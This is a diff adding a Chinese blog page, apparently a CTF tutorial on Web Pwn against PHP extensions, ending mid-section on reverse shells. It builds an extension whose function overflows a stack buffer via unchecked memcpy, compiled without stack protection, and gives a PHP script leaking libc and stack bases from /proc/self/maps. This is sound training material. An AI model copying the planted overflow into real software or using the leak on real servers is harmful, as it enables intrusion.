@@ -1,0 +1,1126 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CTF-PWN：Web Pwn 入门 · Y0uYuGe</title>
+<meta name="description" content="目前 Web Pwn 大多针对 PHP。分析重点是 PHP 加载的外部扩展，因为漏洞通常位于 .so 扩展库中。PHP 通过加载扩展库来调用其内部函数，因此与常规 PWN 题最大的区别在于无法直接获得交互式 shell。通常需要使用 popen 或 exec 函数族执行 bash 命令来反弹 shell，直接执行 one_gadget 或 system 并不可行。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups">题解</a></nav>
+    <h1>CTF-PWN：Web Pwn 入门</h1>
+    <div class="meta"><time>2024-08-12</time><span class="tag">#Frontend</span><span class="tag">#android</span><span class="tag">#web</span><span class="tag">#Pwn</span><span class="tag">#CTF</span><span class="tag">#Heap</span></div>
+    <article class="post-body">
+<h1 id="参考资料">参考资料</h1>
+<p><a href="https://xz.aliyun.com/t/15166?time__1311=GqjxuQi=DQ=0yRx%2bxCqiKwmmm93Y5Lox#toc-1">https://xz.aliyun.com/t/15166?time__1311=GqjxuQi%3DDQ%3D0yRx%2BxCqiKwmmm93Y5Lox#toc-1</a></p>
+<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/3716">https://forum.butian.net/share/3716</a></p>
+<h1 id="简介">简介</h1>
+<p>目前 Web Pwn 大多针对 PHP。分析重点是 PHP 加载的外部扩展，因为漏洞通常位于 .so 扩展库中。PHP 通过加载扩展库来调用其内部函数，因此与常规 PWN 题最大的区别在于无法直接获得交互式 shell。通常需要使用 popen 或 exec 函数族执行 bash 命令来反弹 shell，直接执行 one_gadget 或 system 并不可行。</p>
+<h1 id="生命周期">生命周期</h1>
+<ol>
+<li>扩展模块的生命周期：</li>
+</ol>
+<p>a) 模块初始化（MINIT）：PHP 解释器启动时会加载相关模块，并调用各模块的 MINIT 方法；该方法只调用一次。
+示例：假设有一个数据库连接池扩展。</p>
+<pre><code class="language-c">PHP_MINIT_FUNCTION(db_pool)
+{
+    // 初始化连接池
+    initialize_connection_pool();
+    return SUCCESS;
+}
+</code></pre>
+<p>此函数只在 PHP 启动时调用一次，用于初始化连接池。</p>
+<p>b) 请求初始化（RINIT）：每次请求到达时触发。SAPI 层将控制权交给 PHP 层；PHP 初始化执行本次请求脚本所需的环境变量、函数列表等，并调用所有模块的 RINIT 函数。
+示例：一个会话管理扩展。</p>
+<pre><code class="language-c">PHP_RINIT_FUNCTION(session_manager)
+{
+    // 为每个请求创建新的会话
+    create_new_session();
+    return SUCCESS;
+}
+</code></pre>
+<p>此函数在每次 HTTP 请求开始时调用，为每个请求创建新会话。</p>
+<p>c) 请求关闭（RSHUTDOWN）：请求结束时，PHP 自动运行清理流程，依次调用各模块的 RSHUTDOWN 方法，清理程序运行期间使用的符号表。
+示例：用于清理请求专属资源的扩展。</p>
+<pre><code class="language-c">PHP_RSHUTDOWN_FUNCTION(resource_cleaner)
+{
+    // 清理请求期间分配的资源
+    free_request_resources();
+    return SUCCESS;
+}
+</code></pre>
+<p>每次请求结束时调用，用于清理该请求使用的资源。</p>
+<p>d) 模块关闭（MSHUTDOWN）：服务器关闭时，PHP 调用各模块的 MSHUTDOWN 方法来释放内存。
+示例：关闭数据库连接池。</p>
+<pre><code class="language-c">PHP_MSHUTDOWN_FUNCTION(db_pool)
+{
+    // 关闭连接池
+    shutdown_connection_pool();
+    return SUCCESS;
+}
+</code></pre>
+<p>PHP 终止时调用，用于清理模块级资源。</p>
+<ol start="2">
+<li>PHP 运行模式：</li>
+</ol>
+<p>a) CLI 运行模式（单进程 SAPI）：
+示例：</p>
+<pre><code class="language-bash">php script.php
+</code></pre>
+<p>该命令启动 PHP 解释器，执行 script.php 后退出。整个过程只有一次 MINIT 和一次 MSHUTDOWN，RINIT 和 RSHUTDOWN 也会因脚本执行而各调用一次。</p>
+<p>b) CGI 运行模式（通常为多进程 SAPI）：
+示例：Apache 配合 mod_cgi。
+HTTP 请求到达时，Apache 为每个请求 fork 一个新的 PHP 进程。</p>
+<pre><code>[Apache] &lt;- HTTP Request
+    |
+    ├── [PHP Process 1] (MINIT -&gt; RINIT -&gt; Execute -&gt; RSHUTDOWN -&gt; MSHUTDOWN)
+    |
+    ├── [PHP Process 2] (MINIT -&gt; RINIT -&gt; Execute -&gt; RSHUTDOWN -&gt; MSHUTDOWN)
+    |
+    └── [PHP Process 3] (MINIT -&gt; RINIT -&gt; Execute -&gt; RSHUTDOWN -&gt; MSHUTDOWN)
+</code></pre>
+<p>每个进程处理完一个请求后就会终止，因此每个请求都会经历完整的模块生命周期。</p>
+<blockquote>
+<p>fork 出来的进程通常与原进程具有完全相同的内存布局。因此，如果能获得 /proc/{pid}/maps 文件，就可以获取该进程的内存布局，形成内存泄露。在 De1CTF 的那道 WEBPWN 题中，这就是最初的突破口：利用存在漏洞的 include 函数读取 /proc/self/maps，得到所有基址，从而绕过 PIE 保护。</p>
+</blockquote>
+<pre><code class="language-bash">llk@ubuntu:~/Desktop/tools/php-src/ext/hello/modules$  cat /proc/90065/maps
+555555554000-555555627000 r--p 00000000 08:05 286222                     /usr/bin/php7.4
+555555627000-555555891000 r-xp 000d3000 08:05 286222                     /usr/bin/php7.4
+555555891000-555555957000 r--p 0033d000 08:05 286222                     /usr/bin/php7.4
+555555958000-5555559e3000 r--p 00403000 08:05 286222                     /usr/bin/php7.4
+5555559e3000-5555559e5000 rw-p 0048e000 08:05 286222                     /usr/bin/php7.4
+5555559e5000-555555ba0000 rw-p 00000000 00:00 0                          [heap]
+7ffff3f22000-7ffff3fa3000 rw-p 00000000 00:00 0 
+7ffff3fcc000-7ffff3fd0000 r--p 00000000 08:05 280238                     /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.0
+7ffff3fd0000-7ffff3fe3000 r-xp 00004000 08:05 280238                     /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.0
+7ffff3fe3000-7ffff3fed000 r--p 00017000 08:05 280238                     /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.0
+7ffff3fed000-7ffff3fee000 r--p 00020000 08:05 280238                     /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.0
+7ffff3fee000-7ffff3fef000 rw-p 00021000 08:05 280238                     /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.0
+7ffff3fef000-7ffff3ffb000 r--p 00000000 08:05 280162                     /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.5
+7ffff3ffb000-7ffff40c9000 r-xp 0000c000 08:05 280162                     /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.5
+7ffff40c9000-7ffff4106000 r--p 000da000 08:05 280162                     /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.5
+7ffff4106000-7ffff4108000 r--p 00116000 08:05 280162                     /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.5
+7ffff4108000-7ffff410d000 rw-p 00118000 08:05 280162                     /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.5
+7ffff410d000-7ffff4111000 r--p 00000000 08:05 280080                     /usr/lib/x86_64-linux-gnu/libexslt.so.0.8.20
+7ffff4111000-7ffff411f000 r-xp 00004000 08:05 280080                     /usr/lib/x86_64-linux-gnu/libexslt.so.0.8.20
+7ffff411f000-7ffff4123000 r--p 00012000 08:05 280080                     /usr/lib/x86_64-linux-gnu/libexslt.so.0.8.20
+7ffff4123000-7ffff4124000 r--p 00015000 08:05 280080                     /usr/lib/x86_64-linux-gnu/libexslt.so.0.8.20
+</code></pre>
+<p>c) FastCGI 运行模式（多进程 SAPI，但进程可以复用）：
+示例：Nginx 配合 PHP-FPM。</p>
+<pre><code>[Nginx] &lt;- HTTP Requests
+    |
+    ├── [PHP-FPM Process 1] (MINIT -&gt; [RINIT -&gt; Execute -&gt; RSHUTDOWN] x N -&gt; MSHUTDOWN)
+    |
+    └── [PHP-FPM Process 2] (MINIT -&gt; [RINIT -&gt; Execute -&gt; RSHUTDOWN] x N -&gt; MSHUTDOWN)
+</code></pre>
+<p>PHP-FPM 进程处理多个请求后才会退出，因此 MINIT 和 MSHUTDOWN 仅在进程启动和终止时各调用一次，而 RINIT 和 RSHUTDOWN 会在每次请求时调用。</p>
+<h1 id="php-扩展模块">PHP 扩展模块</h1>
+<p><a href="https://blog.yanjingang.com/?p=3070">小猪教你开发 PHP 扩展</a>
+在 Linux 环境中，PHP 扩展通常是 .so 文件。扩展模块的存放路径可以按下图方式查看：
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-001-fa850f78e1.png" alt="图片"></p>
+<h2 id="搭建-php-环境">搭建 PHP 环境</h2>
+<pre><code class="language-bash">sudo apt install php php-dev # 安装php，以及php开发包头
+php -v # 查看php版本 直到当前对应的版本是7.4.3
+</code></pre>
+<p>根据版本下载对应源码。
+<a href="https://github.com/php/php-src/tree/PHP-7.4.3">https://github.com/php/php-src/tree/PHP-7.4.3</a>
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-002-d0c1e515c6.png" alt="图片"></p>
+<pre><code class="language-bash">git clone https://github.com/php/php-src.git
+cd  php-src
+git checkout PHP-7.4.3
+git fetch
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-003-b8580ccd3f.png" alt="图片"></p>
+<p>源码目录结构：</p>
+<pre><code class="language-c">php-src
+  |____build    --和编译有关的目录，里面包括wk，awk和sh脚本用于编译处理，其中m4文件是linux下编译程序自动生成的文件，可以使用buildconf命令操作具体的配置文件。
+  |____ext      --扩展库代码，例如Mysql，gd，zlib，xml，iconv 等我们熟悉的扩展库，ext_skel是linux下扩展生成脚本，windows下使用ext_skel_win32.php。
+  |____main     --主目录，包含PHP的主要宏定义文件，php.h包含绝大部分PHP宏及PHP API定义。
+  |____netware  --网络目录，只有sendmail_nw.h和start.c，分别定义SOCK通信所需要的头文件和具体实现。
+  |____pear     --扩展包目录，PHP Extension and Application Repository。
+  |____sapi     --各种服务器的接口调用，如Apache，IIS等。
+  |____scripts  --linux下的脚本目录。
+  |____tests    --测试脚本目录，主要是phpt脚本，由--TEST--，--POST--，--FILE--，--EXPECT--组成，需要初始化可添加--INI--部分。
+  |____TSRM     --线程安全资源管理器，Thread Safe Resource Manager保证在单线程和多线程模型下的线程安全和代码一致性。
+  |____win32    --Windows下编译PHP 有关的脚本。
+  |____Zend     --包含Zend引擎的所有文件，包括PHP的生命周期，内存管理，变量定义和赋值以及函数宏定义等等。
+</code></pre>
+<h2 id="初始化扩展模块">初始化扩展模块</h2>
+<pre><code class="language-bash">cd ext
+php ext_skel.php --ext extend_name 在当前目录生成一个extend_name 的文件夹
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-004-6ecc105da8.png" alt="图片"></p>
+<pre><code class="language-bash">cd hello
+ls
+config.m4  config.w32  hello.c  php_hello.h  tests
+</code></pre>
+<ol>
+<li><p>config.m4</p>
+<ul>
+<li>用途：类 Unix 系统的配置脚本。</li>
+<li>作用：定义扩展的构建选项，包括依赖、编译标志等。</li>
+<li>运行 ./configure 时使用。</li>
+</ul>
+</li>
+<li><p>config.w32</p>
+<ul>
+<li>用途：Windows 系统的配置脚本。</li>
+<li>作用：与 config.m4 类似，但用于 Windows 环境。</li>
+<li>在 Windows 上编译扩展时使用。</li>
+</ul>
+</li>
+<li><p>hello.c</p>
+<ul>
+<li>用途：扩展的主源码文件。</li>
+<li>作用：<ul>
+<li>包含扩展核心功能的实现。</li>
+<li>定义 PHP 函数、类、常量等。</li>
+<li>包含模块初始化和关闭函数。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>php_hello.h</p>
+<ul>
+<li>用途：扩展的头文件。</li>
+<li>作用：<ul>
+<li>声明 hello.c 中定义的函数。</li>
+<li>定义扩展使用的常量和宏。</li>
+<li>可能包含其他必要的结构体定义。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>tests/ 目录</p>
+<ul>
+<li>用途：存放扩展的测试文件。</li>
+<li>作用：<ul>
+<li>包含用于测试扩展功能的 .phpt 文件。</li>
+<li>帮助确保扩展在不同环境中正常工作。</li>
+<li>可通过 <code>make test</code> 运行这些测试。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="编写扩展模块">编写扩展模块</h2>
+<p>编写 PHP 扩展以 Zend API 和一组宏为基础。因此，在编写核心代码前，需要先了解 PHP 扩展的结构。在 C 语言层面，PHP 扩展实际上就是一个 zend_module_entry 结构体。</p>
+<p>其类型 zend_module_entry 的定义位于 PHP 源码的 &quot;Zend/zend_modules.h&quot; 文件中。下面的代码就是 zend_module_entry 的定义。</p>
+<pre><code class="language-c">typedef struct _zend_module_entry zend_module_entry;
+struct _zend_module_entry {
+  unsigned short size;
+  unsigned int zend_api;
+  unsigned char zend_debug;
+  unsigned char zts;
+  const struct _zend_ini_entry *ini_entry;
+  const struct _zend_module_dep *deps;
+  const char *name;        # PHP Extension的名字
+  const struct _zend_function_entry *functions;  # 存放我们在此扩展中定义的函数的引用
+  int (*module_startup_func)(INIT_FUNC_ARGS);  # 函数指针，扩展模块加载时被调用
+  int (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS); # 函数指针，扩展模块卸载时时被调用
+  int (*request_startup_func)(INIT_FUNC_ARGS); # 函数指针，每个请求开始时时被调用
+  int (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS); # 函数指针，每个请求结束时时被调用
+  void (*info_func)(ZEND_MODULE_INFO_FUNC_ARGS);  # 函数指针，这个指针指向的函数会在执行phpinfo()时被调用，用于显示自定义模块信息。
+  const char *version;  # 模块的版本
+  size_t globals_size;
+  #ifdef ZTS
+  ts_rsrc_id* globals_id_ptr;
+  #else
+  void* globals_ptr;
+  #endif
+  void (*globals_ctor)(void *global TSRMLS_DC);
+  void (*globals_dtor)(void *global TSRMLS_DC);
+  int (*post_deactivate_func)(void);
+  int module_started;
+  unsigned char type;
+  void *handle;
+  int module_number;
+  char *build_id;
+};
+</code></pre>
+<p>接下来看看自动生成的 <code>hello_module_entry</code>。</p>
+<pre><code class="language-c">zend_module_entry hello_module_entry = {
+	STANDARD_MODULE_HEADER,
+	&quot;hello&quot;,					/* Extension name */
+	hello_functions,			/* zend_function_entry */
+	NULL,							/* PHP_MINIT - Module initialization */
+	NULL,							/* PHP_MSHUTDOWN - Module shutdown */
+	PHP_RINIT(hello),			/* PHP_RINIT - Request initialization */
+	NULL,							/* PHP_RSHUTDOWN - Request shutdown */
+	PHP_MINFO(hello),			/* PHP_MINFO - Module info */
+	PHP_HELLO_VERSION,		/* Version */
+	STANDARD_MODULE_PROPERTIES
+};
+</code></pre>
+<p>宏 &quot;STANDARD_MODULE_HEADER&quot; 生成前 6 个字段，&quot;STANDARD_MODULE_PROPERTIES&quot; 生成 &quot;version&quot; 之后的字段，中间则是运行各阶段调用的函数。</p>
+<pre><code class="language-c">PHP_RINIT(hello)对应到
+PHP_RINIT_FUNCTION(hello)
+{
+……
+}
+PHP_MINFO(hello)对应到
+PHP_MINFO_FUNCTION(hello)
+{
+……
+}
+</code></pre>
+<p>使用 PHP_FUNCTION 宏修饰的函数可以直接在 PHP 中调用。</p>
+<pre><code class="language-c">PHP_FUNCTION(easy_phppwn)
+{
+	char *arg = NULL;
+    size_t arg_len, len;
+    char buf[100];
+    if(zend_parse_parameters(ZEND_NUM_ARGS(), &quot;s&quot;, &amp;arg, &amp;arg_len) == FAILURE){
+        return;
+    }
+    memcpy(buf, arg, arg_len);
+    php_printf(&quot;The baby phppwn.\n&quot;);
+    return SUCCESS;
+}
+</code></pre>
+<blockquote>
+<p>参数解析通过 zend_parse_parameters 函数实现。它从函数使用者的输入栈中读取数据，将其转换为相应的函数参数，填入变量，供后续核心功能代码使用。zend_parse_parameters 的第一个参数是用户传入的参数数量，可由宏 &quot;ZEND_NUM_ARGS()&quot; 生成；第二个参数是字符串，每个字母代表一种变量类型。这里只有一个字符串类型变量，因此第二个参数为 &quot;s&quot;。最后，每个参数还需要一些必要的局部变量指针来存放数据。下表给出了不同变量类型对应的字母及所需的局部变量指针。</p>
+</blockquote>
+<pre><code class="language-bash">对于一个参数，可以使用一个字符序列表示该参数的解析规则。在后面的变长参数中，需要顺序传入参数保存值的引用值。
+
+PHP使用一个字母表示参数应该被解析为什么类型。具体的对应关系如下：
+
+a  - array (zval*)
+A  - array or object (zval*)
+b  - boolean (zend_bool)
+C  - class (zend_class_entry*)
+d  - double (double)
+f  - function or array containing php method call info (returned as
+     zend_fcall_info and zend_fcall_info_cache)
+h  - array (returned as HashTable*)
+H  - array or HASH_OF(object) (returned as HashTable*)
+l  - long (zend_long)
+n  - long or double (zval*)
+o  - object of any type (zval*)
+O  - object of specific type given by class entry (zval*, zend_class_entry)
+p  - valid path (string without null bytes in the middle) and its length (char*, size_t)
+P  - valid path (string without null bytes in the middle) as zend_string (zend_string*)
+r  - resource (zval*)
+s  - string (with possible null bytes) and its length (char*, size_t)
+S  - string (with possible null bytes) as zend_string (zend_string*)
+z  - the actual zval (zval*)
+*  - variable arguments list (0 or more)
++  - variable arguments list (1 or more)
+
+还可以使用下面3个符号：
+
+|  - 放在上面字母的前面表示参数的解析规则为可选参数，其应该被初始化为默认值，以防止PHP代码没有传入该参数。
+/  - 对其所跟的参数调用 SEPARATE_ZVAL()。 
+!  - 所跟的参数可以为指定类型或 NULL。如果传入 NULL 且输出类型为指针，则输出的 C 语言指针为 NULL。对于类型 &#39;b&#39;、&#39;l&#39;、&#39;d&#39;，一个额外的 zend_bool* 类型需要在对应的 bool*、zend_long*、double* 后被传入。如果传入 PHP NULL 则一个非0值将会被写到 zend_bool 中。
+</code></pre>
+<p>最后还需要在 <code>zend_function_entry</code> 中注册。</p>
+<pre><code class="language-c">static const zend_function_entry hello_functions[] = {
+	PHP_FE(easy_phppwn,		NULL)
+	PHP_FE_END
+};
+</code></pre>
+<p>然后将其放到 <code> const struct _zend_function_entry *functions;  # 存放我们在此扩展中定义的函数的引用</code> 所在的位置，也就是 <code>hello_module_entry</code> 中的对应字段。</p>
+<h2 id="编译扩展模块">编译扩展模块</h2>
+<pre><code class="language-bash">phpize
+./configure --with-php-config=/usr/bin/php-config
+</code></pre>
+<p>然后在生成的 Makefile 中，在下图位置设置编译参数：关闭栈保护，并去掉 -O2 优化，否则会加入 FORTIFY 保护，使 memcpy 函数增加长度检查，变成 __memcpy_chk 函数。</p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-005-c7f33f94c4.png" alt="图片"></p>
+<p>设置好后，直接使用 make 命令编译。编译完成后，当前目录会生成 ./modules 目录，其中包含所需的 .so 扩展文件。将其复制到 PHP 扩展目录，然后配置 php.ini 启用该扩展。
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-006-582cc8ed6b.png" alt="图片"></p>
+<pre><code class="language-bash">/etc/php/7.4/apache2/php.ini
+/etc/php/7.4/cli/php.ini # 通常调试时使用CLI模式，所以只配置了该目录下的php.ini文件
+</code></pre>
+<pre><code class="language-bash">sudo cp hello.so /usr/lib/php/20190902/ # 将扩展库赋值到php搜索扩展库的路径中
+</code></pre>
+<p>注意，题目在 php.ini 中禁用了部分函数。
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-007-806df28c29.png" alt="图片"></p>
+<h2 id="测试">测试</h2>
+<pre><code class="language-bash">&lt;?php
+phpinfo()
+$a = &quot;abcd&quot;;
+easy_phppwn($a);
+?&gt;
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-008-94e0a16ab0.png" alt="图片">
+<img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-009-17fe67c425.png" alt="图片"></p>
+<h1 id="安全检查">安全检查</h1>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-010-701b2cf5e4.png" alt="图片"></p>
+<h1 id="调试">调试</h1>
+<h2 id="宿主机">宿主机</h2>
+<p>导入 IDA。</p>
+<pre><code class="language-c">void __cdecl zif_easy_phppwn(zend_execute_data *execute_data, zval *return_value)
+{
+  char buf[100]; // [rsp+10h] [rbp-80h] BYREF
+  size_t n; // [rsp+80h] [rbp-10h] BYREF
+  char *arg; // [rsp+88h] [rbp-8h] BYREF
+
+  arg = 0LL;
+  if ( (unsigned int)zend_parse_parameters(execute_data-&gt;This.u2.next, &quot;s&quot;, &amp;arg, &amp;n) != -1 )
+  {
+    memcpy(buf, arg, n);
+    php_printf(&quot;The baby phppwn.\n&quot;);
+  }
+}
+</code></pre>
+<p>存在栈溢出，先泄露 libc 地址，再执行 ROP。</p>
+<pre><code class="language-bash">gdb php
+r
+vmmap
+……
+    0x7ffff7fc4000     0x7ffff7fc5000 r--p     1000      0 /usr/lib/php/20190902/hello.so
+    0x7ffff7fc5000     0x7ffff7fc6000 r-xp     1000   1000 /usr/lib/php/20190902/hello.so
+    0x7ffff7fc6000     0x7ffff7fc7000 r--p     1000   2000 /usr/lib/php/20190902/hello.so
+    0x7ffff7fc7000     0x7ffff7fc8000 r--p     1000   2000 /usr/lib/php/20190902/hello.so
+    0x7ffff7fc8000     0x7ffff7fc9000 rw-p     1000   3000 /usr/lib/php/20190902/hello.so
+……
+</code></pre>
+<p>可以看到，扩展模块已经加载。</p>
+<p>设置断点时，先 run，再按 ctrl+c 中断，然后设置断点（因为扩展库在 run 之后才会加载），接着设置参数并重新运行。由于是自行使用 make 编译的，且包含调试信息，因此可以进行源码级调试。</p>
+<pre><code class="language-bash">pwndbg&gt; run
+pwndbg&gt; b*zif_easy_phppwn
+Breakpoint 1 at 0x7ffff7fc51b9: file /home/llk/Desktop/tools/php-src/ext/hello/hello.c, line 12.
+pwndbg&gt; set args ./pwn.php
+</code></pre>
+<pre><code class="language-bash"> ► 0x7ffff7fc51b9 &lt;zif_easy_phppwn&gt;       endbr64 
+   0x7ffff7fc51bd &lt;zif_easy_phppwn+4&gt;     push   rbp
+   0x7ffff7fc51be &lt;zif_easy_phppwn+5&gt;     mov    rbp, rsp                        RBP =&gt; 0x7fffffffa430 ◂— 0
+   0x7ffff7fc51c1 &lt;zif_easy_phppwn+8&gt;     sub    rsp, 0x90                       RSP =&gt; 0x7fffffffa3a0 (0x7fffffffa430 - 0x90)
+   0x7ffff7fc51c8 &lt;zif_easy_phppwn+15&gt;    mov    qword ptr [rbp - 0x88], rdi     [0x7fffffffa3a8] =&gt; 0x7ffff5413090 ◂— 0x6461656820666f20 (&#39; of head&#39;)
+   0x7ffff7fc51cf &lt;zif_easy_phppwn+22&gt;    mov    qword ptr [rbp - 0x90], rsi     [0x7fffffffa3a0] =&gt; 0x7fffffffa490 —▸ 0x7fffffffca40 —▸ 0x555555a33170 ◂— ...
+   0x7ffff7fc51d6 &lt;zif_easy_phppwn+29&gt;    mov    qword ptr [rbp - 8], 0          [0x7fffffffa428] =&gt; 0
+   0x7ffff7fc51de &lt;zif_easy_phppwn+37&gt;    mov    rax, qword ptr [rbp - 0x88]     RAX, [0x7fffffffa3a8] =&gt; 0x7ffff5413090 ◂— 0x6461656820666f20 (&#39; of head&#39;)
+   0x7ffff7fc51e5 &lt;zif_easy_phppwn+44&gt;    mov    eax, dword ptr [rax + 0x2c]     EAX, [0x7ffff54130bc] =&gt; 1
+   0x7ffff7fc51e8 &lt;zif_easy_phppwn+47&gt;    mov    edi, eax                        EDI =&gt; 1
+   0x7ffff7fc51ea &lt;zif_easy_phppwn+49&gt;    lea    rdx, [rbp - 0x10]               RDX =&gt; 0x7fffffffa420 ◂— 1
+─────────────────────────────────────────────────────────[ SOURCE (CODE) ]─────────────────────────────────────────────────────────
+In file: /home/llk/Desktop/tools/php-src/ext/hello/hello.c:12
+    7 #include &quot;php.h&quot;
+    8 #include &quot;ext/standard/info.h&quot;
+    9 #include &quot;php_hello.h&quot;
+   10 
+   11 PHP_FUNCTION(easy_phppwn)
+ ► 12 {
+   13         char *arg = NULL;
+   14     size_t arg_len, len;
+   15     char buf[100];
+   16     if(zend_parse_parameters(ZEND_NUM_ARGS(), &quot;s&quot;, &amp;arg, &amp;arg_len) == FAILURE){
+   17         return;
+</code></pre>
+<p>如果直接在 libc 函数上设置的断点无法命中，可以先断在 main，再设置断点。</p>
+<h2 id="docker">docker</h2>
+<p>可以直接运行 exp.php 进行调试，但要记得设置断点。</p>
+<pre><code class="language-c">gdbserver :1234 /usr/local/bin/php /var/www/html/exp.php
+</code></pre>
+<pre><code class="language-bash">b _start  连接后先执行，然后会加载libc库
+b* __libc_start_main+128 会调用一个函数去解析php
+该函数然后call rax会进入另一个函数
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-011-7ffa0aa257.png" alt="图片">
+在另一个函数内部，最终通过 <code>call qword ptr [rdx+0x10]</code> 加载库。</p>
+<pre><code class="language-bash">b*pie+0x247861  和php版本有关
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-012-6138e8617b.png" alt="图片">
+此后才能在库内的函数上设置断点。</p>
+<p><strong>或者</strong></p>
+<p>在 docker 中安装 gdbserver 后运行：</p>
+<pre><code class="language-bash">gdbserver :1234 php -S 0:8080 exp.php
+</code></pre>
+<p>这样 gdbserver 会监听本地 1234 端口，PHP 则监听本地 8080 端口。访问 8080 端口相当于执行 php index.php。然后多次使用 n 命令，执行完第一条 call 指令后，PHP 运行所需的动态链接库（不包括 C 扩展）就全部加载了。进入 _start 后，执行流程进入 _libc_start_main；执行一条 call rax 指令后进入监听状态，同时可以看到 C 扩展的加载情况。</p>
+<h1 id="实用技巧">实用技巧</h1>
+<h2 id="泄露-procselfmaps">泄露 /proc/self/maps</h2>
+<pre><code class="language-php">&lt;?php
+// 读取 /proc/self/maps 文件内容
+$content = file_get_contents(&#39;/proc/self/maps&#39;);
+echo $content ; //打印/proc/self/maps内容
+// 函数用于解析基地址
+function getBaseAddress($content, $pattern) {
+    if (preg_match_all($pattern, $content, $matches)) {
+        return $matches[1]; // 返回所有匹配的基地址
+    }
+    return null;
+}
+
+// 匹配 libc 的基地址
+$libcPattern = &#39;/^([0-9a-f]+)-[0-9a-f]+\\s+r--p\\s+.*?\\s+\\S*libc.*$/m&#39;;
+$libcBaseAddresses = getBaseAddress($content, $libcPattern);
+
+if ($libcBaseAddresses) {
+    echo &quot;libc base addresses:\n&quot;;
+    foreach ($libcBaseAddresses as $address) {
+        echo &quot;0x$address\n&quot;;
+        break;
+    }
+} else {
+    echo &quot;No libc base address found.\n&quot;;
+}
+
+// 匹配 stack 的基地址
+$stackPattern = &#39;/^([0-9a-f]+)-[0-9a-f]+\\s+rw-p\\s+.*?\\s+\\[stack\\]$/m&#39;;
+$stackBaseAddresses = getBaseAddress($content, $stackPattern);
+
+if ($stackBaseAddresses) {
+    echo &quot;stack base address:\n&quot;;
+    foreach ($stackBaseAddresses as $address) {
+        echo &quot;0x$address\n&quot;;
+        break;
+    }
+} else {
+    echo &quot;No stack base address found.\n&quot;;
+}
+?&gt;
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-013-39e0fcc517.png" alt="图片"></p>
+<h2 id="利用溢出调用-mprotect-修改栈权限">利用溢出调用 mprotect 修改栈权限</h2>
+<p>存在溢出时，可以通过 ROP 链调用 mprotect 函数，为栈赋予执行权限，再找到 jmp rsp，直接执行 shellcode。</p>
+<h2 id="反弹-shell">反弹 shell</h2>
+<p>原理：</p>
+<ol>
+<li>攻击者在自己的机器上监听指定端口。</li>
